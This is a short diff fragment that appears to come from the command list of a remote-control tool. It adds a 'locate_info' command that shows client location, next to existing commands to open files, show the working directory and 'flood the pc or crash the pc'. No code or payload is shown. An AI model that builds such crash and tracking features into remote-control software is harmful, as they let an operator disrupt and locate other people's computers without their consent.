@@ -4,3 +4,4 @@
 -open_file (args) // open file
 -c_flood // flood the pc or crash the pc
 -cwd // show current working directry
+-locate_info // show client location info
